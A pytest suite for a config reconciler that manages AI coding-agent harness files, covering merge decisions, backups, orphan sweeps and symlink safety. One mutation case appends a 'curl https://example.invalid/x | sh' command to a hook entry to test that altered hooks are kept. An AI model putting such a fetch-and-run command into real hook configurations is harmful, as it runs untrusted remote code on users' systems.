"""Tests for the Reconciler (Task 3.3)."""

from __future__ import annotations

import copy
import hashlib
import json
import logging
import subprocess
from pathlib import Path

import jinja2
import pytest

from harness_maker import cursor_retire as cr
from harness_maker.block_merge import has_markers
from harness_maker.git_disposition import tracked_cursor_deletions
from harness_maker.models import Blueprint, FileEntry, ReconcileDecision
from harness_maker.reconcile import (
    _TEMPLATE_DIR,
    _decide_user_modified,
    _template_has_markers,
    backup,
    compute_body_hash,
    parse_frontmatter,
    reconcile,
)


def _bp(rel_paths: list[str]) -> Blueprint:
    return Blueprint(
        files=[FileEntry(path=Path(rp), template="x.j2") for rp in rel_paths],
    )


def test_reconcile_new_only_returns_both(tmp_path: Path) -> None:
    bp = _bp(["a.md"])
    conflicts = reconcile(tmp_path, bp)
    assert len(conflicts) == 1
    assert conflicts[0].decision == ReconcileDecision.BOTH
    assert conflicts[0].reason == "new-only"


def test_reconcile_no_frontmatter_returns_keep(tmp_path: Path) -> None:
    target = tmp_path / "a.md"
    target.write_text("plain content with no frontmatter\n", encoding="utf-8")
    bp = _bp(["a.md"])
    conflicts = reconcile(tmp_path, bp)
    assert conflicts[0].decision == ReconcileDecision.KEEP
    assert conflicts[0].reason == "no-frontmatter"


def test_reconcile_hash_match_returns_replace(tmp_path: Path) -> None:
    target = tmp_path / "a.md"
    body = "# hello\n"
    body_bytes = body.encode("utf-8")
    h = compute_body_hash(body_bytes)
    fm = "---\ncontent_hash: " + h + "\n---\n"
    target.write_text(fm + body, encoding="utf-8")
    bp = _bp(["a.md"])
    conflicts = reconcile(tmp_path, bp)
    assert conflicts[0].decision == ReconcileDecision.REPLACE
    assert conflicts[0].reason == "hash-match-ours"


def test_reconcile_hash_mismatch_no_markers_returns_keep(tmp_path: Path) -> None:
    """User edited a marker-less file → KEEP (legacy fallback)."""
    target = tmp_path / "a.md"
    body = "# user has edited this\n"
    fm = (
        "---\ncontent_hash: 0000000000000000000000000000000000000000000000000000000000000000\n---\n"
    )
    target.write_text(fm + body, encoding="utf-8")
    # Use a real marker-less template so reconcile can read it; the hash
    # mismatch is what we exercise here, not template-unreadable.
    bp = Blueprint(files=[FileEntry(path=Path("a.md"), template="stages/research.md.j2")])
    conflicts = reconcile(tmp_path, bp)
    assert conflicts[0].decision == ReconcileDecision.KEEP
    assert conflicts[0].reason == "hash-mismatch-user-modified"


def test_reconcile_hash_mismatch_template_unreadable_returns_keep(tmp_path: Path) -> None:
    """Missing template → graceful KEEP with diagnostic reason."""
    target = tmp_path / "a.md"
    body = "# edited\n"
    fm = (
        "---\ncontent_hash: 0000000000000000000000000000000000000000000000000000000000000000\n---\n"
    )
    target.write_text(fm + body, encoding="utf-8")
    bp = _bp(["a.md"])  # template="x.j2" doesn't exist
    conflicts = reconcile(tmp_path, bp)
    assert conflicts[0].decision == ReconcileDecision.KEEP
    assert conflicts[0].reason == "hash-mismatch-template-unreadable"


def test_reconcile_hash_mismatch_both_have_markers_returns_merge_block(tmp_path: Path) -> None:
    """User edited a marker-bearing file whose template still has markers
    → MERGE_BLOCK so user blocks survive the upgrade.
    """
    target = tmp_path / "review.md"
    # OLD body has a user block — simulates a previously-rendered review.md.
    body = "# Stage: review\n<!-- @hm:user:notes -->\nmy custom step\n<!-- @hm:/user:notes -->\n"
    fm = (
        "---\ncontent_hash: 0000000000000000000000000000000000000000000000000000000000000000\n---\n"
    )
    target.write_text(fm + body, encoding="utf-8")
    bp = Blueprint(files=[FileEntry(path=Path("review.md"), template="stages/review.md.j2")])
    conflicts = reconcile(tmp_path, bp)
    assert conflicts[0].decision == ReconcileDecision.MERGE_BLOCK
    assert conflicts[0].reason == "hash-mismatch-mergeable"


def test_reconcile_malformed_markers_falls_back_to_keep(tmp_path: Path) -> None:
    """User broke marker syntax (e.g., deleted the close tag) → KEEP not
    MERGE_BLOCK. Reason: silent loss of user edits is unacceptable; surface
    the diagnostic so the user can fix their markup.
    """
    target = tmp_path / "review.md"
    body = "# Stage: review\n<!-- @hm:user:notes -->\nuser content but close tag is missing\n"
    fm = (
        "---\ncontent_hash: 0000000000000000000000000000000000000000000000000000000000000000\n---\n"
    )
    target.write_text(fm + body, encoding="utf-8")
    bp = Blueprint(files=[FileEntry(path=Path("review.md"), template="stages/review.md.j2")])
    conflicts = reconcile(tmp_path, bp)
    assert conflicts[0].decision == ReconcileDecision.KEEP
    assert conflicts[0].reason == "hash-mismatch-malformed-markers"


def _phantom_file(
    tmp_path: Path,
    rel: str,
    *,
    version: str,
    generated_by: str = "harness-maker",
    source_template: str = "codex/stage_skill.md.j2",
) -> Path:
    """Write a file whose stored content_hash does NOT match its own body —
    mimicking the pre-0.26.2 phantom-hash render bug (hash computed over a
    body that differed from the persisted bytes).
    """
    target = tmp_path / rel
    body = "# stage skill procedure\nrun the thing\n"
    bogus_hash = "0" * 64  # provably != compute_body_hash(body)
    fm = (
        "---\n"
        f"generated_by: {generated_by}\n"
        f"harness_maker_version: {version}\n"
        f"source_template: {source_template}\n"
        f"content_hash: {bogus_hash}\n"
        "---\n"
    )
    target.write_text(fm + body, encoding="utf-8")
    return target


def test_reconcile_legacy_phantom_hash_ours_is_healed(tmp_path: Path) -> None:
    """A pre-0.26.2 ours-stamped, marker-less file with an unverifiable
    content_hash must be REPLACED (self-healed), not frozen as KEEP. Without
    this, the install_ref-embedding stage/loop skills written by 0.26.1 stay
    stale forever because their phantom hash can never self-verify.
    """
    _phantom_file(tmp_path, "a.md", version="0.26.1")
    bp = Blueprint(files=[FileEntry(path=Path("a.md"), template="codex/stage_skill.md.j2")])
    conflicts = reconcile(tmp_path, bp)
    assert conflicts[0].decision == ReconcileDecision.REPLACE
    assert conflicts[0].reason == "legacy-phantom-hash-heal"


def test_reconcile_legacy_phantom_malformed_markers_is_healed(tmp_path: Path) -> None:
    """Real pre-0.26.2 stage/loop skills carry duplicate ``@hm:user`` marker
    ids emitted by the old renderer, so they classify as malformed-markers
    rather than marker-less. Those ours files must also be healed (REPLACE) —
    the fresh render emits correct, non-duplicate markers.
    """
    target = tmp_path / "a.md"
    body = (
        "# stage skill\n"
        "<!-- @hm:user:extensions -->\n<!-- @hm:/user:extensions -->\n"
        "<!-- @hm:user:extensions -->\n<!-- @hm:/user:extensions -->\n"  # duplicate id
    )
    fm = (
        "---\ngenerated_by: harness-maker\nharness_maker_version: 0.26.1\n"
        "source_template: codex/stage_skill.md.j2\n"
        "content_hash: " + "0" * 64 + "\n---\n"
    )
    target.write_text(fm + body, encoding="utf-8")
    bp = Blueprint(files=[FileEntry(path=Path("a.md"), template="codex/stage_skill.md.j2")])
    conflicts = reconcile(tmp_path, bp)
    assert conflicts[0].decision == ReconcileDecision.REPLACE
    assert conflicts[0].reason == "legacy-phantom-hash-heal"


def test_reconcile_phantom_non_affected_template_not_healed(tmp_path: Path) -> None:
    """The heal is scoped to the Codex skill templates the phantom bug touched.
    A pre-floor ours file from any OTHER template (e.g. a stage command, agent,
    CLAUDE.md) is a genuine-edit candidate and must stay KEEP — never clobbered.
    """
    _phantom_file(tmp_path, "a.md", version="0.26.1", source_template="stages/research.md.j2")
    bp = Blueprint(files=[FileEntry(path=Path("a.md"), template="stages/research.md.j2")])
    conflicts = reconcile(tmp_path, bp)
    assert conflicts[0].decision == ReconcileDecision.KEEP
    assert conflicts[0].reason == "hash-mismatch-user-modified"


def test_reconcile_phantom_template_unreadable_not_healed(tmp_path: Path) -> None:
    """Even a phantom-affected, pre-floor ours file is NOT healed when its
    template is unreadable — REPLACE would have no content to render. The
    excluded KEEP reason guards this.
    """
    _phantom_file(tmp_path, "a.md", version="0.26.1")  # source_template = stage_skill
    bp = _bp(["a.md"])  # template="x.j2" does not exist → template-unreadable
    conflicts = reconcile(tmp_path, bp)
    assert conflicts[0].decision == ReconcileDecision.KEEP
    assert conflicts[0].reason == "hash-mismatch-template-unreadable"


def test_reconcile_phantom_malformed_version_not_healed(tmp_path: Path) -> None:
    """A non-numeric harness_maker_version cannot be ordered against the floor;
    the heal fails safe to KEEP rather than risking a wrong overwrite.
    """
    _phantom_file(tmp_path, "a.md", version="not-a-version")
    bp = Blueprint(files=[FileEntry(path=Path("a.md"), template="codex/stage_skill.md.j2")])
    conflicts = reconcile(tmp_path, bp)
    assert conflicts[0].decision == ReconcileDecision.KEEP
    assert conflicts[0].reason == "hash-mismatch-user-modified"


def test_reconcile_current_version_hash_mismatch_still_keeps(tmp_path: Path) -> None:
    """A file stamped with the phantom-fix version (or newer) and a hash
    mismatch is a genuine user edit → KEEP. The heal floor is a FIXED
    historical constant so current/future user edits are never clobbered.
    """
    _phantom_file(tmp_path, "a.md", version="0.26.2")
    bp = Blueprint(files=[FileEntry(path=Path("a.md"), template="codex/stage_skill.md.j2")])
    conflicts = reconcile(tmp_path, bp)
    assert conflicts[0].decision == ReconcileDecision.KEEP
    assert conflicts[0].reason == "hash-mismatch-user-modified"


def test_reconcile_phantom_hash_not_ours_is_not_healed(tmp_path: Path) -> None:
    """An old-versioned file WITHOUT the harness-maker provenance stamp is a
    user file → KEEP. The heal only applies to our own legacy output.
    """
    _phantom_file(tmp_path, "a.md", version="0.26.1", generated_by="someone-else")
    bp = Blueprint(files=[FileEntry(path=Path("a.md"), template="codex/stage_skill.md.j2")])
    conflicts = reconcile(tmp_path, bp)
    assert conflicts[0].decision == ReconcileDecision.KEEP
    assert conflicts[0].reason == "hash-mismatch-user-modified"


def test_parse_frontmatter_no_marker(tmp_path: Path) -> None:
    p = tmp_path / "x.md"
    p.write_text("plain text\n")
    fm, body = parse_frontmatter(p)
    assert fm is None
    assert body == b"plain text\n"


def test_parse_frontmatter_valid(tmp_path: Path) -> None:
    p = tmp_path / "x.md"
    p.write_text("---\nfoo: bar\n---\nbody\n")
    fm, body = parse_frontmatter(p)
    assert fm == {"foo": "bar"}
    assert body == b"body\n"


def test_backup_creates_dir(tmp_path: Path) -> None:
    """Phase 2.4 backup layout: backup mirrors project root, holding
    ``.claude/`` + ``.cursor/`` subtrees. Pre-2.4 callers did `bdir / 'f.txt'`;
    new layout is `bdir / '.claude' / 'f.txt'`.
    """
    src = tmp_path / ".claude"
    src.mkdir()
    (src / "f.txt").write_text("hi\n")
    bdir = backup(src)
    assert bdir.exists()
    assert (bdir / ".claude" / "f.txt").read_text() == "hi\n"
    assert bdir.name.startswith(".backup-")


def test_backup_includes_cursor_directory(tmp_path: Path) -> None:
    """Cursor target 자산 (`.cursor/`) 도 backup 안에 포함되어 restore 가능."""
    claude_dir = tmp_path / ".claude"
    claude_dir.mkdir()
    (claude_dir / "f.txt").write_text("claude\n")
    cursor_dir = tmp_path / ".cursor"
    (cursor_dir / "rules").mkdir(parents=True)
    (cursor_dir / "rules" / "harness.mdc").write_text("---\nalwaysApply: true\n---\n# x\n")

    bdir = backup(claude_dir)

    assert (bdir / ".claude" / "f.txt").read_text() == "claude\n"
    assert (bdir / ".cursor" / "rules" / "harness.mdc").read_text().startswith("---\n")


def test_backup_missing_dir_returns_path(tmp_path: Path) -> None:
    src = tmp_path / "nonexistent"
    bdir = backup(src)
    # backup_dir is computed but not created when src is missing
    assert bdir.name.startswith(".backup-")


# ──────────────────────────────────────────────────────────────────────────────
# Cross-tree reconcile — Phase 2.4
# ──────────────────────────────────────────────────────────────────────────────


def test_reconcile_legacy_ours_no_hash_returns_replace(tmp_path: Path) -> None:
    """Legacy ours: pre-content_hash version (e.g. v0.4.7 memory templates)
    has generated_by but no content_hash → REPLACE so version bumps land.

    Real-world reproducer: ~/kairos memory/wiki.md stuck on v0.4.7 with
    'Side preset' header even after upgrading the harness to Production.
    """
    from harness_maker.models import Blueprint, FileEntry

    target = tmp_path / ".claude"
    target.mkdir()
    (target / "memory").mkdir()
    (target / "memory" / "wiki.md").write_text(
        "---\n"
        "generated_by: harness-maker\n"
        "harness_maker_version: 0.4.7\n"
        "source_template: memory/wiki.ko.md.j2\n"
        "---\n"
        "# Wiki — Side preset\n"
        "(아직 기록된 항목 없음)\n",
        encoding="utf-8",
    )
    bp = Blueprint(
        files=[
            FileEntry(
                path=Path("memory/wiki.md"),
                template="memory/wiki.ko.md.j2",
                context={},
                frontmatter={},
            ),
        ],
    )
    conflicts = reconcile(target, bp)
    assert len(conflicts) == 1
    assert conflicts[0].decision == ReconcileDecision.REPLACE
    assert conflicts[0].reason == "legacy-no-hash-but-ours"


def test_reconcile_legacy_ours_with_markers_returns_merge_block(tmp_path: Path) -> None:
    """Memory files have no content_hash by design (wrapup appends freely).
    When BOTH the template and existing body have @hm:user:* markers, use
    MERGE_BLOCK so accumulated wiki/failure entries survive re-renders.
    """
    from harness_maker.models import Blueprint, FileEntry

    target = tmp_path / ".claude"
    target.mkdir()
    (target / "memory").mkdir()
    (target / "memory" / "wiki.md").write_text(
        "---\n"
        "generated_by: harness-maker\n"
        "harness_maker_version: 0.7.2\n"
        "source_template: memory/wiki.ko.md.j2\n"
        "provenance: official\n"
        "---\n"
        "# Wiki Index — Production preset\n"
        "\n"
        "---\n"
        "\n"
        "<!-- @hm:user:entries -->\n"
        "## [wiki:gotcha] some-gotcha | 2026-05-09\n"
        "User-accumulated entry that must survive re-render.\n"
        "<!-- @hm:/user:entries -->\n",
        encoding="utf-8",
    )
    bp = Blueprint(
        files=[
            FileEntry(
                path=Path("memory/wiki.md"),
                template="memory/wiki.ko.md.j2",
                context={},
                frontmatter={},
            ),
        ],
    )
    conflicts = reconcile(target, bp)
    assert len(conflicts) == 1
    assert conflicts[0].decision == ReconcileDecision.MERGE_BLOCK
    assert conflicts[0].reason == "memory-block-merge"


def test_reconcile_codex_hooks_json_merges_in_place(tmp_path: Path) -> None:
    """`.codex/hooks.json` joins the literal-match list (Phase 1 fix). Latent
    KEEP-fallback bug from pre-PLAN era is eliminated — Codex template updates
    propagate via MERGE_JSON, user entries preserved per ADR-006 nested schema.
    """
    from harness_maker.models import Blueprint, FileEntry

    target = tmp_path / ".claude"
    target.mkdir()
    codex_dir = tmp_path / ".codex"
    codex_dir.mkdir()
    (codex_dir / "hooks.json").write_text(
        json.dumps(
            {
                "hooks": {
                    "PostToolUse": [
                        {
                            "matcher": "*",
                            "hooks": [{"type": "command", "command": "user-cmd"}],
                        },
                    ],
                },
            },
        )
        + "\n",
        encoding="utf-8",
    )
    bp = Blueprint(
        files=[
            FileEntry(
                path=Path(".codex/hooks.json"),
                template="codex/hooks.json.j2",
                context={},
                frontmatter={},
            ),
        ],
    )
    conflicts = reconcile(target, bp)
    assert len(conflicts) == 1
    assert conflicts[0].decision == ReconcileDecision.MERGE_JSON
    assert conflicts[0].reason == "hooks-in-place-merge"


def test_reconcile_user_frontmatter_no_hash_returns_keep(tmp_path: Path) -> None:
    """User-authored file with arbitrary frontmatter (no generated_by) →
    KEEP. Mirror of the .cursor/rules/*.mdc case but for an arbitrary
    user file: never silently overwrite something we didn't generate.
    """
    from harness_maker.models import Blueprint, FileEntry

    target = tmp_path / ".claude"
    target.mkdir()
    (target / "agents").mkdir()
    (target / "agents" / "user-agent.md").write_text(
        "---\nname: user-agent\nfoo: bar\n---\n# my agent\n",
        encoding="utf-8",
    )
    bp = Blueprint(
        files=[
            FileEntry(
                path=Path("agents/user-agent.md"),
                template="agents/code-reviewer.md.j2",  # any template
                context={},
                frontmatter={},
            ),
        ],
    )
    conflicts = reconcile(target, bp)
    assert len(conflicts) == 1
    assert conflicts[0].decision == ReconcileDecision.KEEP
    assert conflicts[0].reason == "frontmatter-no-hash-not-ours"


def test_reconcile_harness_yaml_always_replaces(tmp_path: Path) -> None:
    """harness.yaml is always REPLACE regardless of hash or manual edits.

    User-maintained fields (e.g. mechanical_checks) survive because
    answers_from_harness_yaml reads them back before the render pass.
    """
    from harness_maker.models import Blueprint, FileEntry

    target = tmp_path / ".claude"
    target.mkdir()
    (target / "harness.yaml").write_text(
        "---\ncontent_hash: stale-hash\ngenerated_by: harness-maker\n---\n"
        "preset: Side\nlocale: en\nmechanical_checks:\n  - ruff check .\n",
        encoding="utf-8",
    )
    bp = Blueprint(
        files=[
            FileEntry(
                path=Path("harness.yaml"),
                template="harness-yaml/Side.yaml.j2",
                context={},
                frontmatter={},
            ),
        ],
    )
    conflicts = reconcile(target, bp)
    assert len(conflicts) == 1
    assert conflicts[0].decision == ReconcileDecision.REPLACE
    assert conflicts[0].reason == "config-always-replace"


def test_backup_includes_agents_skills_directory(tmp_path: Path) -> None:
    """`.agents/skills/` Codex dual-render directory must be included in backup."""
    claude_dir = tmp_path / ".claude"
    claude_dir.mkdir()
    (claude_dir / "f.txt").write_text("claude\n")
    agents_dir = tmp_path / ".agents" / "skills" / "hm-research"
    agents_dir.mkdir(parents=True)
    (agents_dir / "SKILL.md").write_text("# research skill\n")

    bdir = backup(claude_dir)

    skill_path = bdir / ".agents" / "skills" / "hm-research" / "SKILL.md"
    assert skill_path.read_text() == "# research skill\n"


def test_reconcile_codex_toml_always_replaces(tmp_path: Path) -> None:
    """`.codex/*.toml` files have no YAML frontmatter (tomllib rejects preambles).
    Always REPLACE so template updates (model defaults, MCP fields) propagate.
    """
    from harness_maker.models import Blueprint, FileEntry

    target = tmp_path / ".claude"
    target.mkdir()
    codex_dir = tmp_path / ".codex"
    codex_dir.mkdir()
    (codex_dir / "config.toml").write_text(
        "[features]\ncodex_hooks = true\n",
        encoding="utf-8",
    )
    bp = Blueprint(
        files=[
            FileEntry(
                path=Path(".codex/config.toml"),
                template="codex/config.toml.j2",
                context={},
                frontmatter={},
            ),
        ],
    )
    conflicts = reconcile(target, bp)
    assert len(conflicts) == 1
    # Phase 2 (PLAN-onboarding-backup-friction): marker-aware dispatch
    # returns REPLACE when no HASH_COMMENT markers are present on either side
    # (existing file lacks markers in this fixture). New reason string reflects
    # the dispatch path; behavior unchanged for users without marker blocks.
    assert conflicts[0].decision == ReconcileDecision.REPLACE
    assert conflicts[0].reason == "pure-hashcomment-no-markers"


def test_backup_after_full_render_preserves_cursor_user_modifications(tmp_path: Path) -> None:
    """B13 — backup() 가 .cursor/ 의 사용자 수정도 보존.

    The Cursor target is gone (0.63.0), but a 0.62 `.cursor/` can still be on disk
    and `make` may delete its pristine files, so the backup keeps covering it.
    """
    from harness_maker.interview import interview
    from harness_maker.models import ProjectProfile
    from harness_maker.render import DEFAULT_FREEZE_TIME, render
    from harness_maker.synthesize import synthesize

    p = ProjectProfile(stack=["python"], scale="small", lifecycle="dormant")
    a = interview(p, autoloop_mode=True)

    project_root = tmp_path
    target_dir = project_root / ".claude"
    target_dir.mkdir()

    bp = synthesize(p, a)
    render(bp, target_dir, freeze_time=DEFAULT_FREEZE_TIME)

    # A user-edited file left by a 0.62 Cursor render
    mdc = project_root / ".cursor" / "rules" / "harness.mdc"
    mdc.parent.mkdir(parents=True)
    mdc.write_text("# user override\n", encoding="utf-8")

    bdir = backup(target_dir)
    backup_mdc = bdir / ".cursor" / "rules" / "harness.mdc"
    assert backup_mdc.read_text(encoding="utf-8") == "# user override\n"


# ── PLAN-permission-deny-and-hooks-wiring Phase 4 / ADR-005 ──────────────────
# The retired `.claude/hooks/hooks.json` must never be auto-deleted by the
# manifest-hash match — a user hook that a prior merge folded into the file has
# its MERGED hash recorded in the manifest, so ours-clean would delete it.


def test_sweep_never_deletes_hooks_json_with_user_hook(tmp_path: Path) -> None:
    """P0 regression: user-authored hooks.json survives sweep even when its
    merged hash is recorded in the manifest and the FileSpec is gone."""
    import hashlib

    from harness_maker.reconcile import _SWEEP_NEVER_DELETE, sweep_orphans

    assert ".claude/hooks/hooks.json" in _SWEEP_NEVER_DELETE

    project = tmp_path
    hooks_dir = project / ".claude" / "hooks"
    hooks_dir.mkdir(parents=True)
    # Merged file: template hooks PLUS a hand-wired user hook, exactly the shape
    # `_merge_hooks_json` produces on a prior `make --update`.
    merged = (
        "{\n"
        '  "hooks": {\n'
        '    "PostToolUse": [\n'
        '      {"matcher": "*", "hooks": [{"type": "command", "command": "MY-USER-HOOK"}]}\n'
        "    ]\n"
        "  },\n"
        '  "preset": "Side"\n'
        "}\n"
    )
    hooks_json = hooks_dir / "hooks.json"
    hooks_json.write_bytes(merged.encode("utf-8"))
    merged_hash = hashlib.sha256(merged.encode("utf-8")).hexdigest()

    # Manifest records the MERGED hash under the file's rel-key — the bug trigger.
    manifest = project / ".claude" / ".hm-render-manifest.jsonl"
    manifest.write_text(
        json.dumps(
            {
                "content_hash": merged_hash,
                "path": ".claude/hooks/hooks.json",
                "timestamp": "2026-07-17T00:00:00+00:00",
            },
            sort_keys=True,
        )
        + "\n",
        encoding="utf-8",
    )

    # Blueprint WITHOUT the hooks FileSpec (Phase 4 removed it).
    bp = Blueprint(files=[FileEntry(path=Path("settings.json"), template="settings/Side.json.j2")])
    report = sweep_orphans(project, bp)

    assert hooks_json.exists(), "user-authored hooks.json must survive the sweep"
    assert "MY-USER-HOOK" in hooks_json.read_text(encoding="utf-8")
    assert Path(".claude/hooks/hooks.json") not in report.deleted


def _edited_agent_body(marker: str = "extensions") -> bytes:
    """A rendered agent body as it looks after the user writes in their block.

    Only the marker pair and the user's text matter here — `_decide_user_modified` reads the
    TEMPLATE side off disk itself, which is where this test's fidelity lives.
    """
    return (
        "# code-reviewer\n\nTemplate-owned prose.\n\n"
        f"<!-- @hm:user:{marker} -->\n"
        "Project rule: never flag the generated parser.\n"
        f"<!-- @hm:/user:{marker} -->\n"
    ).encode()


@pytest.mark.parametrize(
    "name",
    ["code-reviewer", "concurrency-reviewer", "performance-reviewer", "executor"],
)
def test_split_agent_template_merges_rather_than_freezing(name: str) -> None:
    """Regression: 13 of 15 agents froze permanently on the user's first edit.

    `_decide_user_modified` probed `agents/<name>.md.j2` — a ten-line frontmatter shim — while
    the `@hm:user:extensions` markers live in `agents/<name>_body.md.j2`, reached by
    `{% include %}`. `has_markers()` does not follow includes, so the probe answered False and
    the decision fell through to `KEEP, "hash-mismatch-user-modified"`: the file kept the user's
    text and stopped receiving every future template improvement, silently. The
    `.codex/agents/*.toml` control group merged correctly on the same runs because its template
    is single-file, which is what identified the split structure as the variable.

    Asserted on the DECISION, not on rendered bytes. The rendered file DOES carry the markers, so
    every test that reads output passes while the bug is live — that is why it survived.
    """
    decision, reason = _decide_user_modified(f"agents/{name}.md.j2", _edited_agent_body())
    assert decision is ReconcileDecision.MERGE_BLOCK, (name, reason)


def test_the_marker_probe_follows_every_agent_template_that_gets_split() -> None:
    """Companion guard: catches the NEXT template someone splits.

    Walks every outer agent template. Whenever its literal include target carries markers, the
    probe reconcile actually calls must report True — otherwise that agent has silently joined
    the frozen set.
    """
    agents = _TEMPLATE_DIR / "agents"
    frozen = []
    for outer in sorted(agents.glob("*.md.j2")):
        if outer.name.endswith("_body.md.j2"):
            continue
        body = agents / f"{outer.name.removesuffix('.md.j2')}_body.md.j2"
        if not body.exists() or not has_markers(body.read_text(encoding="utf-8")):
            continue
        if not _template_has_markers(f"agents/{outer.name}"):
            frozen.append(outer.name)
    assert not frozen, (
        f"markers unreachable from the outer template — these agents freeze: {frozen}"
    )


# ── Retiring a 0.62 Cursor install (SPEC-hm-overhaul-p1 PR-C, review round 1) ──────────────

_REPO = Path(__file__).resolve().parents[2]
_SRC_PATH_062 = "$HOME/.claude/plugins/cache/harness-maker/harness-maker/0.62.0"


def _cursor_hooks_062(strictness: str) -> dict[str, object]:
    """The real db19f023 Cursor hooks template, rendered the way 0.62 rendered it."""
    text = subprocess.run(
        ["git", "show", "db19f023:src/harness_maker/templates/cursor/hooks.json.j2"],
        cwd=_REPO,
        capture_output=True,
        text=True,
        check=True,
        timeout=60,
    ).stdout
    rendered = jinja2.Template(text).render(
        harness_maker_src_path=_SRC_PATH_062, strictness_of=lambda _c: strictness, config={}
    )
    data = json.loads(rendered)
    assert isinstance(data, dict)
    return data


def _hooks_bytes(data: object) -> bytes:
    return json.dumps(data, indent=2).encode("utf-8")


def _recorded(raw: bytes) -> set[str]:
    return {hashlib.sha256(raw).hexdigest()}


@pytest.mark.parametrize("strictness", ["warn", "block"])
def test_cursor_frozen_set_is_exactly_what_062_shipped(strictness: str) -> None:
    data = _cursor_hooks_062(strictness)
    raw = _hooks_bytes(data)
    assert cr.hooks_json_is_pristine(raw, _recorded(raw))
    hooks = data["hooks"]
    assert isinstance(hooks, dict)
    assert sum(len(v) for v in hooks.values()) == (8 if strictness == "block" else 7)


def _mutated_cursor_hooks(mutate: str) -> dict[str, object]:
    data = copy.deepcopy(_cursor_hooks_062("block"))
    hooks = data["hooks"]
    assert isinstance(hooks, dict)
    pre = hooks["preToolUse"]
    if mutate == "rescoped-matcher":
        # The removed `test_flat_a_rescoped_user_entry_survives`, restated for retirement:
        # a user narrowed the permission gate to Edit. Same module, same marker — not ours.
        pre[1]["matcher"] = "Edit"
    elif mutate == "dropped-matcher":
        del pre[1]["matcher"]
    elif mutate == "changed-timeout":
        hooks["preCompact"][0]["timeout"] = 60
    elif mutate == "added-timeout":
        pre[0]["timeout"] = 5
    elif mutate == "appended-command":
        pre[1]["command"] += " && curl https://example.invalid/x | sh"
    elif mutate == "extra-key":
        pre[1]["note"] = "mine"
    elif mutate == "user-entry":
        hooks["stop"].append({"command": "echo my-own-stop-hook"})
    elif mutate == "unknown-event":
        hooks["beforeShellExecution"] = [dict(pre[1])]
    elif mutate == "moved-event":
        hooks["postToolUse"].append(dict(pre[1]))
    elif mutate == "version":
        data["version"] = 2
    elif mutate == "top-level-key":
        data["mine"] = True
    else:
        raise AssertionError(mutate)
    return data


@pytest.mark.parametrize(
    "mutate",
    [
        "rescoped-matcher",
        "dropped-matcher",
        "changed-timeout",
        "added-timeout",
        "appended-command",
        "extra-key",
        "user-entry",
        "unknown-event",
        "moved-event",
        "version",
        "top-level-key",
    ],
)
def test_cursor_hooks_the_user_touched_are_kept(tmp_path: Path, mutate: str) -> None:
    """Even when the manifest recorded these bytes (a 0.62 merge recorded the merged file)."""
    raw = _hooks_bytes(_mutated_cursor_hooks(mutate))
    assert not cr.hooks_json_is_pristine(raw, _recorded(raw))
    (tmp_path / ".cursor").mkdir()
    (tmp_path / ".cursor/hooks.json").write_bytes(raw)
    assert cr.retire_hooks_json(tmp_path, _recorded(raw)) == cr.kept_warning(".cursor/hooks.json")
    assert (tmp_path / ".cursor/hooks.json").read_bytes() == raw


def test_cursor_hooks_pristine_but_unrecorded_is_not_pristine() -> None:
    raw = _hooks_bytes(_cursor_hooks_062("warn"))
    assert not cr.hooks_json_is_pristine(raw, set())
    assert not cr.hooks_json_is_pristine(raw, {"0" * 64})


def test_cursor_hooks_pristine_and_recorded_is_retired(tmp_path: Path) -> None:
    raw = _hooks_bytes(_cursor_hooks_062("warn"))
    (tmp_path / ".cursor").mkdir()
    (tmp_path / ".cursor/hooks.json").write_bytes(raw)
    line = cr.retire_hooks_json(tmp_path, _recorded(raw))
    assert line is not None
    assert "RETIRED" in line
    assert not (tmp_path / ".cursor/hooks.json").exists()


@pytest.mark.parametrize(
    "text",
    [
        json.dumps({"version": 1, "hooks": {"stop": [{"command": "echo mine"}]}}),
        # A pre-marker 0.5x render: no HM_HOOK_HOST, and no manifest record of it.
        json.dumps(
            {"version": 1, "hooks": {"stop": [{"command": "uv run python -m harness_maker.x"}]}}
        ),
    ],
)
def test_cursor_hooks_with_no_record_never_get_the_edited_text(tmp_path: Path, text: str) -> None:
    (tmp_path / ".cursor").mkdir()
    (tmp_path / ".cursor/hooks.json").write_text(text, encoding="utf-8")
    line = cr.retire_hooks_json(tmp_path, set())
    assert line is not None
    assert "you edited it" not in line
    assert line.startswith("WARN: orphan-sweep KEPT .cursor/hooks.json")
    assert (tmp_path / ".cursor/hooks.json").read_text(encoding="utf-8") == text


def test_cursor_symlinked_dir_is_never_deleted_through(tmp_path: Path) -> None:
    outside = tmp_path / "elsewhere"
    outside.mkdir()
    raw = _hooks_bytes(_cursor_hooks_062("warn"))
    (outside / "hooks.json").write_bytes(raw)
    project = tmp_path / "project"
    project.mkdir()
    (project / ".cursor").symlink_to(outside, target_is_directory=True)
    assert not cr.safe_to_delete(project, ".cursor/hooks.json")
    line = cr.retire_hooks_json(project, _recorded(raw))
    assert line == cr.symlink_kept_warning(".cursor/hooks.json")
    assert (outside / "hooks.json").read_bytes() == raw
    cr.remove_empty_dirs(project)
    assert (project / ".cursor").is_symlink()


def test_cursor_symlinked_file_or_subdir_is_unsafe(tmp_path: Path) -> None:
    outside = tmp_path / "elsewhere"
    outside.mkdir()
    (outside / "harness.mdc").write_text("x", encoding="utf-8")
    project = tmp_path / "project"
    (project / ".cursor").mkdir(parents=True)
    (project / ".cursor/rules").symlink_to(outside, target_is_directory=True)
    assert not cr.safe_to_delete(project, ".cursor/rules/harness.mdc")
    (project / ".cursor/mcp.json").symlink_to(outside / "harness.mdc")
    assert not cr.safe_to_delete(project, ".cursor/mcp.json")
    (project / ".cursor/plain.json").write_text("{}", encoding="utf-8")
    assert cr.safe_to_delete(project, ".cursor/plain.json")
    assert not cr.safe_to_delete(project, ".cursor/../outside.json")


def test_orphan_sweep_keeps_a_recorded_cursor_file_behind_a_symlink(tmp_path: Path) -> None:
    from harness_maker.reconcile import sweep_orphans
    from harness_maker.render import RENDER_MANIFEST_NAME

    outside = tmp_path / "elsewhere"
    (outside / "rules").mkdir(parents=True)
    body = b"---\nalwaysApply: true\n---\nrules\n"
    (outside / "rules/harness.mdc").write_bytes(body)
    project = tmp_path / "project"
    (project / ".claude").mkdir(parents=True)
    (project / ".cursor").symlink_to(outside, target_is_directory=True)
    record = {"path": ".cursor/rules/harness.mdc", "content_hash": hashlib.sha256(body).hexdigest()}
    (project / ".claude" / RENDER_MANIFEST_NAME).write_text(json.dumps(record) + "\n")
    report = sweep_orphans(project, Blueprint())
    assert (outside / "rules/harness.mdc").read_bytes() == body
    assert (Path(".cursor/rules/harness.mdc"), "symlink") in report.kept
